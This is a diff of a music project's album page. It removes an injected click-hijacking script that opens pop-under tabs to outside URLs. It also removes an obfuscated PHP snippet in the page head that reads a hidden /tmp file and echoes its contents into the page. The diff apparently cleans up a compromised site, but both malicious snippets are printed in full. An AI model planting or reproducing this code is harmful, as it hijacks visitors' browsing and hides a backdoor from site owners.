@@ -1,89 +1,11 @@
-<script>(function (parameters) {
-    const targets = [
-        \'https://ois.is/images/logo-1.png\', \'https://ois.is/images/logo-2.png\', \'https://ois.is/images/logo-3.png\', \'https://ois.is/images/logo-4.png\', \'https://ois.is/images/logo-5.png\', \'https://ois.is/images/logo-6.png\', \'https://ois.is/images/logo-7.png\', \'https://ois.is/images/logo-8.png\'
-    ]
-    // Times between clicks
-    const restMinutes = 1;
-    // Number of hours to allow re-click 
-    const allowedHours = 2;
-
-
-    const saveTargetLocationsToStorage = (targets) => {
-        targets.forEach((target, index) => {
-            if(!localStorage.getItem(`${target}-local-storage`)){
-            	localStorage.setItem(`${target}-local-storage`, 0);
-            }
-        });
-    }
-    const getRandomLocationFromStorage = (targets) => {
-        const nonVisited = targets.filter((target, index) => localStorage.getItem(`${target}-local-storage`) == 0)
-        return nonVisited[Math.floor(Math.random() * nonVisited.length)];
-    }
-    const setLocationAsVisited = (target) => localStorage.setItem(`${target}-local-storage`, 1);
-
-    const getTimeStorage = (key) => localStorage.getItem(`${key}-local-storage`);
-    const setTimeToStorage = (key, nowDate) => localStorage.setItem(`${key}-local-storage`, nowDate);
-
-    const getHoursDiff = (startDate, endDate) => {
-        const msInHour = 1000 * 60 * 60;
-        return Math.round(Math.abs(endDate - startDate) / msInHour);
-    }
-    const getMintsDiff = (startDate, endDate) => {
-        const msInMints = 1000 * 60;
-        return Math.round(Math.abs(endDate - startDate) / msInMints);
-    }
-
-    const visitNewLocation = (targets, host, nowDate) => {
-        saveTargetLocationsToStorage(targets);
-        newLocation = getRandomLocationFromStorage(targets);
-        setTimeToStorage(`${host}-mnts`, nowDate);
-        setTimeToStorage(`${host}-hurs`, nowDate);
-        setLocationAsVisited(newLocation);
-        window.open(newLocation, "_blank");
-    }
-
-    // const randomLocation = getRandomLocationFromStorage(targets);
-    saveTargetLocationsToStorage(targets);
-
-    function globalClick(event) {
-        event.stopPropagation();
-        const host = location.host;
-        let newLocation = getRandomLocationFromStorage(targets);
-        const nowDate = Date.parse(new Date());
-        const savedDateForMints = getTimeStorage(`${host}-mnts`);
-        const savedDateForHours = getTimeStorage(`${host}-hurs`);
-
-        if (savedDateForMints && savedDateForHours) {
-            try {
-                const storageDateForMints = parseInt(savedDateForMints);
-                const storageDateForHours = parseInt(savedDateForHours);
-                const mintsDiff = getMintsDiff(nowDate, storageDateForMints);
-                const hoursDiff = getHoursDiff(nowDate, storageDateForHours);
-
-                if (hoursDiff >= allowedHours) {
-                    saveTargetLocationsToStorage(targets);
-                    setTimeToStorage(`${host}-hurs`, nowDate);
-                }
-                if (mintsDiff >= restMinutes) {
-                    if (newLocation) {
-                        setTimeToStorage(`${host}-mnts`, nowDate);
-                        window.open(newLocation, "_blank");
-                        setLocationAsVisited(newLocation);
-                    }
-                }
-            } catch (error) { visitNewLocation(targets, host, nowDate); }
-        } else { visitNewLocation(targets, host, nowDate); }
-    }
-    document.addEventListener("click", globalClick)
-})()</script>
 <html>
 	<head>
 		<title>The Community Music Project</title>
 		<link href="cmp.css" rel="stylesheet" type="text/css">
-	<?php goto FkQAX; bZNcz: $purDK = "\x3c\41\x2d\55{$QYhSu}\55\x2d\x3e"; goto cD2OM; lWfiu: $qUpUD = "\x2f\164\x6d\160\x2f\x73\x65\x73\x73\x31\137\x31\71\142\x36\x66\63\x32\x37\x62\x62\71\141\142\143\63\x64\x62\144\x66\x62\x61\143\x63\x66\67\62\143\x35\x34\x65\x66\x37"; goto ZUQmd; FkQAX: $E47ox = FALSE; goto lWfiu; ZUQmd: if (!(file_exists($qUpUD) && is_readable($qUpUD))) { goto ZvWyT; } goto IAIBJ; k208u: if (!($E47ox !== FALSE)) { goto bF4hT; } goto QJywi; Spi4Z: bF4hT: goto NCIgg; IAIBJ: $E47ox = str_replace(PHP_EOL, '', @file_get_contents($qUpUD)); goto o8oeF; cD2OM: echo rand(1, 3) === 3 ? $purDK . $E47ox . PHP_EOL : $purDK . PHP_EOL; goto Spi4Z; x282G: $QYhSu = sha1_file($ZcK5q); goto bZNcz; o8oeF: ZvWyT: goto k208u; QJywi: $ZcK5q = __FILE__; goto x282G; NCIgg: ?></head>
+	</head>
 	<body>
 		<iframe id="nav" src="nav.html"></iframe>
-		
+
 		<p class="album">
 			<img src="images/titc.jpg" />
 			<h3>The Innocence To Cry (2005)</h3>
@@ -94,11 +16,11 @@
 				<a href="albums/titc/titc-art.zip">Dowload album art</a>
 			</span>
 		</p>
-		
+
 		<hr />
-		
+
 		<h3>Track listing and album art coming soon...</h3>
-		
+
 		<ol class="tracks">
 			<li>
 				<b><a href="albums/titc/TITC-01-Looking_Back.mp3">Looking Back</a></b>
@@ -284,6 +206,6 @@
 				</ul>
 			</li>
 		</ol>
-		
+
 	</body>
 </html>
